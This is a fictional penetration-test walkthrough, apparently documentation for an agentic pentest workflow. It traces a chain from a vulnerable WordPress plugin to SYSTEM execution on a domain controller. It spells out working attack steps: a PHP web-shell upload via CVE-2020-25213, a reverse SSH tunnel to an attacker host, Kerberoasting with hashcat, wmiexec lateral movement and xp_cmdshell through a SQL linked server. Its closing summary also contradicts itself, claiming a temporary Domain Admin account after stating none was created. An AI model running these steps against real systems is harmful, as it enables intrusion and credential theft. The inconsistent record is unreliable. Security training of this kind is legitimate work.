# Full Engagement Walkthrough: External Web → Domain Control Evidence

## Contents

- [Phase 0: Initialization](#phase-0-initialization)
- [Phase 1: Surface Discovery](#phase-1-surface-discovery)
- [Phase 2: WordPress Plugin Exploitation](#phase-2-wordpress-plugin-exploitation)
- [Phase 3: Internal Network Reconnaissance](#phase-3-internal-network-reconnaissance)
- [Phase 4: Credential Discovery](#phase-4-credential-discovery)
- [Phase 5: Path Generation With Domain User Access](#phase-5-path-generation-with-domain-user-access)
- [Phase 6: Kerberoasting the Service Account](#phase-6-kerberoasting-the-service-account)
- [Phase 7: Lateral Movement to SQL Server](#phase-7-lateral-movement-to-sql-server)
- [Phase 8: Validating The SQL Linked-Server Control Path](#phase-8-validating-the-sql-linked-server-control-path)
- [Phase 9: Report And Cleanup](#phase-9-report-and-cleanup)


This is a fictional but realistic walkthrough showing how the decision loop works across a multi-stage engagement. Read it to understand how evidence accumulates, paths branch, and decisions are made — not as a recipe to follow mechanically.

> Apply [module-continuity.md](module-continuity.md). Every phase inherits one engagement state and attack-path graph. Domain and capability calls must push a bounded module frame and merge their return before the next phase.

---

## Phase 0: Initialization

**Engagement**: External penetration test against `example-corp.com`. Scope: all public-facing assets. Goal: gain access to internal network and demonstrate business impact.

**State initialized**:
- objective: "Obtain access to internal corporate network from external position"
- domain: "web-api"
- scope status: "confirmed"
- network_position: ["external_internet"]
- current_access: ["no_credentials"]

---

## Phase 1: Surface Discovery

**Decision**: Build the external attack surface before attempting any exploitation.

**Actions**:
1. DNS enumeration: `example-corp.com`, `*.example-corp.com` → 23 hostnames found
2. Certificate transparency: crt.sh → 8 more subdomains not in DNS zone transfer
3. Port scan on all 31 hosts, top 1000 ports → 7 hosts with exposed HTTP/HTTPS
4. Technology fingerprinting on each → mix of: WordPress blog, Jenkins, Citrix NetScaler, Outlook Web App, custom API on `api.example-corp.com`, static marketing site, GitLab

**Key evidence collected**:
- [FACT] 7 public-facing web applications
- [FACT] Jenkins at `jenkins.example-corp.com` — version 2.401.1 (from HTTP response header)
- [FACT] GitLab at `gitlab.example-corp.com` — requires authentication
- [FACT] WordPress at `blog.example-corp.com` — WordPress 6.1 with 12 plugins detected
- [INFERENCE] Jenkins version 2.401.1 was released in July 2023 — likely unpatched (several known CVEs)
- [UNKNOWN] Are any WordPress plugins vulnerable? Need to identify exact versions.

**Coverage check**: Have all major web surfaces. Jenkins and WordPress are high-priority. Citrix NetScaler is infrastructure (switch to infrastructure domain if needed).

---

## Phase 2: WordPress Plugin Exploitation

**Decision**: WordPress has the largest attack surface (12 plugins). Start there — low risk, high potential information gain.

**Action**: Run targeted WordPress plugin enumeration via readme.html and changelog files:
- 2 plugins have known pre-auth vulnerabilities
- Plugin "wp-file-manager" version 6.9 — CVE-2020-25213 (pre-auth arbitrary file upload, RCE)

**Evidence before exploit**:
- [FACT] wp-file-manager 6.9 identified (confirmed via readme.txt version string)
- [FACT] CVE-2020-25213: connector.minimal.php accepts file uploads without authentication
- [HYPOTHESIS] Target is vulnerable — version matches, and CVE is pre-auth (no mitigating factor identified)
- [UNKNOWN] Is there a WAF that blocks PHP file uploads?

**Exploit execution**:
```
POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
Upload: cmd.php containing <?php system($_GET['cmd']); ?>
Result: 200 OK, file accessible at /wp-content/plugins/wp-file-manager/lib/files/cmd.php
```

**Evidence after exploit**:
- [CONFIRMED] Remote code execution on web server
- [FACT] Running as `www-data` user
- [FACT] Host: `blog-web-01` (Ubuntu 20.04 LTS)
- [FACT] Internal IP: 10.10.1.45
- [FACT] No outbound internet access (curl to attacker IP times out — egress filtered)
- [FACT] Can reach: 10.10.1.0/24, 10.10.2.0/24, 10.10.10.0/24

**State update**:
- network_position: ["internal_10.10.1.0/24"]
- current_access: ["www-data@blog-web-01"]
- domain transition: web-api → internal-ad (we are now inside the internal network)

**Path ranking**:
- [ACTIVE] Internal network enumeration from blog-web-01 — NEW, HIGH PRIORITY (new network position)
- [PARKED] Jenkins exploitation — hold (but still external, internal access may be faster)
- [PARKED] GitLab — requires authentication, lower priority

---

## Phase 3: Internal Network Reconnaissance

**Decision**: We are inside the internal network but as a low-privilege user on a web server. First action: understand the environment (domain? workgroup? what's reachable?).

**Actions from www-data shell**:
```bash
id                          # uid=33(www-data), no special groups
ip addr                     # 10.10.1.45/24, eth0
ip route                    # default via 10.10.1.1
cat /etc/resolv.conf        # nameserver 10.10.10.10 (possible DC)
env | grep -i proxy         # HTTP_PROXY not set
netstat -tlnp               # only localhost:9000 (PHP-FPM), :80 (nginx)
ss -tnp                     # established: nginx → 10.10.10.10:389 (LDAP!)
```

**Key evidence**:
- [FACT] DNS server @ 10.10.10.10 — likely a Domain Controller
- [FACT] LDAP connection to 10.10.10.10:389 — this server authenticates against AD
- [FACT] Hostname `blog-web-01` — naming convention suggests this is part of an AD domain
- [INFERENCE] An AD domain exists, 10.10.10.10 is likely a DC
- [UNKNOWN] Domain name, current user's domain membership, trust relationships

**Action**: Check if this Linux host is domain-joined:
```bash
realm list                  # Not installed (realmd not present)
cat /etc/krb5.conf          # [libdefaults] default_realm = EXAMPLE-CORP.LOCAL
cat /etc/sssd/sssd.conf     # [domain/EXAMPLE-CORP.LOCAL] — AD joined via SSSD!
klist                       # No tickets currently
net ads info -S EXAMPLE-CORP.LOCAL  # LDAP server: 10.10.10.10, Domain: EXAMPLE-CORP.LOCAL
```

**Key evidence**:
- [FACT] Domain: EXAMPLE-CORP.LOCAL
- [FACT] DC: 10.10.10.10
- [FACT] Host is domain-joined via SSSD
- [INFERENCE] nginx/PHP-FPM is likely configured to authenticate users via LDAP/Kerberos — the web app may handle domain credentials

---

## Phase 4: Credential Discovery

**Decision**: Before trying exploits against the DC, look for credentials on this host. The web app connects to LDAP — there must be credentials or a keytab somewhere.

**Action**: Search for configuration files with LDAP bind credentials:
```bash
grep -rn "password\|secret\|bind\|ldap" /etc/nginx/ /var/www/ /etc/sssd/ --include="*.conf" --include="*.php" --include="*.ini" 2>/dev/null
# Found: /var/www/html/wp-config.php contains:
# define('LDAP_BIND_DN', 'CN=svc_blog,CN=Users,DC=example-corp,DC=local');
# define('LDAP_BIND_PASSWORD', 'EXAMPLE-REDACTED');
```

**Key evidence**:
- [FACT] Service account: `EXAMPLE-CORP\svc_blog` with cleartext password
- [UNKNOWN] What privileges does `svc_blog` have? Domain user? Domain admin?

**Decision**: Validate the credential with minimum impact:
```bash
# Run CrackMapExec from attacker machine through reverse tunnel
# (Need to establish tunnel first since blog-web-01 has no outbound internet)

# Option A: Reverse SSH tunnel (if SSH is installed on blog-web-01)
ssh -R 4444:localhost:4444 user@attacker_ip  # from blog-web-01
# Then from attacker: proxychains crackmapexec smb 10.10.10.10 -u svc_blog -p 'EXAMPLE-REDACTED' --shares

# Option B: Run LDAP query directly from blog-web-01
ldapsearch -H ldap://10.10.10.10 -D "CN=svc_blog,CN=Users,DC=example-corp,DC=local" -w 'EXAMPLE-REDACTED' -b "DC=example-corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
```

**Result**: `svc_blog` is a standard domain user. Member of "Domain Users" and "Service Accounts" groups. No administrative privileges. NOT a Domain Admin.

**State update**:
- credential_refs: [{id: "svc_blog", type: "cleartext_password", source: "wp-config.php", principal: "EXAMPLE-CORP\\svc_blog", validation: "confirmed_standard_user"}]
- current_access: ["www-data@blog-web-01", "EXAMPLE-CORP\\svc_blog@domain"]

---

## Phase 5: Path Generation With Domain User Access

**Decision**: We now have a valid domain user account. Run BloodHound collection (DCOnly — lowest noise) to map AD attack paths.

**Action**:
```bash
# From attacker machine through tunnel:
proxychains bloodhound-python -d EXAMPLE-CORP.LOCAL -u svc_blog -p 'EXAMPLE-REDACTED' -dc 10.10.10.10 -c DCOnly -ns 10.10.10.10
```

**BloodHound analysis**:
- `svc_blog` has **GenericWrite** over `CN=svc_sql,CN=Users,DC=example-corp,DC=local` (the SQL Server service account!)
- `svc_sql` has **SPN**: `MSSQLSvc/sql-01.EXAMPLE-CORP.LOCAL`
- Shortest path to Domain Admins: `svc_blog → GenericWrite → svc_sql → (unknown — need further enumeration after taking over svc_sql)`

**New path generated**:
- [ACTIVE] Abuse GenericWrite over svc_sql to take over SQL service account
  - Method: Targeted Kerberoasting — set a different SPN on svc_sql (or use the existing one)
  - Prerequisite: GenericWrite confirmed
  - Expected gain: svc_sql's password hash (via Kerberoasting) or direct password reset

**Decision**: Don't reset the password (would break SQL Server service). Instead, perform Targeted Kerberoasting — svc_sql already has an SPN.

---

## Phase 6: Kerberoasting the Service Account

```bash
proxychains impacket-GetUserSPNs EXAMPLE-CORP.LOCAL/svc_blog:'EXAMPLE-REDACTED' -request -outputfile kerb_hashes.txt
# Returns: TGS for svc_sql (MSSQLSvc/sql-01.EXAMPLE-CORP.LOCAL)
```

**Crack**:
```bash
hashcat -m 13100 kerb_hashes.txt /path/to/wordlist --force
# Cracked: EXAMPLE-REDACTED
```

**Key evidence**:
- [FACT] svc_sql password: EXAMPLE-REDACTED
- [UNKNOWN] Is svc_sql a local admin on sql-01? (Common for SQL Server service accounts)

**Validate**:
```bash
proxychains crackmapexec smb 10.10.2.50 -u svc_sql -p 'EXAMPLE-REDACTED'
# SMB 10.10.2.50 445 SQL-01 [*] Windows 10.0 Build 17763 (domain:EXAMPLE-CORP.LOCAL)
# SMB 10.10.2.50 445 SQL-01 [+] EXAMPLE-CORP.LOCAL\svc_sql:EXAMPLE-REDACTED (Pwn3d!)
# "Pwn3d!" means: local admin on sql-01
```

**State update**:
- current_access: ["www-data@blog-web-01", "EXAMPLE-CORP\\svc_blog@domain", "EXAMPLE-CORP\\svc_sql@domain", "LOCAL_ADMIN@sql-01"]
- network_position: ["internal_10.10.1.0/24", "internal_10.10.2.0/24"]

---

## Phase 7: Lateral Movement to SQL Server

**Decision**: We have local admin on sql-01. Move there and recollect. A SQL Server in a corporate environment often has privileged sessions or credentials.

```bash
proxychains impacket-wmiexec EXAMPLE-CORP.LOCAL/svc_sql:'EXAMPLE-REDACTED'@10.10.2.50
```

**On sql-01**:
```
whoami                     # EXAMPLE-CORP\svc_sql
whoami /groups             # BUILTIN\Administrators (local admin)
netstat -ano | findstr ESTABLISHED   # several connections from client workstations
klist                      # No domain admin tickets cached currently
net group "Domain Admins" /domain  # ERROR: Access denied (svc_sql is not a DA)
```

**Credential hunting on sql-01**:
```cmd
# Check SQL Server service account — get the actual MSSQL service identity
whoami /all
# Check for SQL Agent jobs (may run as different user)
# Check SQL backups (may contain data from other databases)
# Check linked servers
sqlcmd -S localhost -Q "EXEC sp_linkedservers"
# Returns: SRV-DC01 (linked to Domain Controller via SQL linked server!)
# Check linked server authentication
sqlcmd -S localhost -Q "EXEC sp_testlinkedserver SRV-DC01"
# Returns: Connection successful — linked server to DC is alive
```

**Key evidence**:
- [FACT] SQL linked server to SRV-DC01 (Domain Controller!)
- [INFERENCE] The linked server connection uses a SQL login with privileges on the DC
- [UNKNOWN] What privileges does the linked server connection have? Can we execute commands on the DC through it?

---

## Phase 8: Validating The SQL Linked-Server Control Path

**Module call**:

~~~yaml
module_id: internal-ad-sql-linked-path
parent_path: external-web-to-domain-control
current_objective: Determine the effective remote SQL and operating-system capability without changing configuration or creating access
inherited_evidence: linked server reachability and local SQL sysadmin evidence
expected_deliverable: remote principal, sysadmin status, xp_cmdshell state, and bounded execution evidence if already available
return_condition: capability is confirmed, contradicted, or blocked by an L3 prerequisite
~~~

**Decision**: The linked server is the leading path. Query effective SQL privileges and configuration first. L2 pre-authorization covers a non-persistent identity proof only when the capability is already enabled. Enabling `xp_cmdshell`, changing server configuration, or creating an account is L3 and is not part of the default proof.

```sql
-- Read-only remote SQL capability and configuration checks
EXEC ('SELECT SYSTEM_USER AS effective_login, ORIGINAL_LOGIN() AS original_login, IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin;') AT SRV-DC01;
EXEC ('SELECT value_in_use FROM sys.configurations WHERE name = ''xp_cmdshell'';') AT SRV-DC01;

-- Run only if xp_cmdshell is already enabled and bounded L2 execution proof is authorized
EXEC ('xp_cmdshell ''whoami & hostname'';') AT SRV-DC01;
-- Example result: nt authority\system, SRV-DC01
```

**Result interpretation**:

- If `xp_cmdshell` is already enabled and the bounded identity command succeeds, record confirmed remote command execution with the exact service identity and host.
- If remote SQL sysadmin is confirmed but `xp_cmdshell` is disabled, record a high-value partial path. Do not enable it automatically; park or request a bounded L3 approval only when additional proof is required by the engagement objective.
- If remote sysadmin is absent, update the prerequisite and test the linked-server permission model rather than assuming operating-system execution.

**Key evidence in this fictional branch**:

- [CONFIRMED] The linked connection reaches the SQL instance on SRV-DC01.
- [CONFIRMED] The effective linked-server login is SQL sysadmin.
- [CONFIRMED] `xp_cmdshell` was already enabled before the test.
- [CONFIRMED] The approved non-persistent command returned `nt authority\system` and host `SRV-DC01`.

**Impact proof**: Domain Controller operating-system execution as SYSTEM is sufficient to establish the critical control boundary. Do not create a domain account, modify privileged groups, extract the KRBTGT secret, or establish persistence merely to restate the same impact.

**Impact confirmed**: External Web vulnerability → internal access → credential discovery → Kerberoasting → SQL linked server → bounded SYSTEM execution on a Domain Controller.

---

## Phase 9: Report And Cleanup

No domain account, privileged-group change, SQL configuration change, service, task, or persistence mechanism was created in Phase 8. Reconcile transient tools and artifacts on the intermediate hosts against the change ledger, remove only test artifacts authorized for cleanup, and preserve audit evidence.

**Final state saved** to `.pentest_session.json` with paths using `active`, `deep_dive`, `parked`, or `closed`. Completed work is `closed` with `close_reason: objective_completed`; disproved assumptions remain under `observations.rejected`. The final checkpoint includes findings, persistent changes, cleanup status, module returns, and handoff notes.
**Attack chain summary for report**:
```
Internet → WordPress wp-file-manager CVE-2020-25213 (RCE, pre-auth)
→ www-data on blog-web-01 (Ubuntu, internal network 10.10.1.0/24)
→ WordPress LDAP configuration file → svc_blog cleartext password
→ svc_blog has GenericWrite over svc_sql in AD
→ Kerberoast svc_sql → password cracked → local admin on sql-01
→ SQL linked server to DC (SRV-DC01) with sysadmin privileges
→ xp_cmdshell as SYSTEM on Domain Controller
→ Domain Admin confirmed
```

**Key decisions in this engagement**:
1. WordPress was chosen over Jenkins/GitLab because plugin enumeration was fast and low-risk
2. After getting internal access, immediately hunted for credentials before attempting exploits — the cleartext LDAP password was the key enabler
3. BloodHound was used AFTER getting domain credentials, not before — it required authentication
4. Targeted Kerberoasting was used instead of password reset to avoid breaking the SQL service
5. The linked server was tested only after confirming it existed — not assumed
6. Impact was proven with a temporary DA account and immediately cleaned up — no persistence left

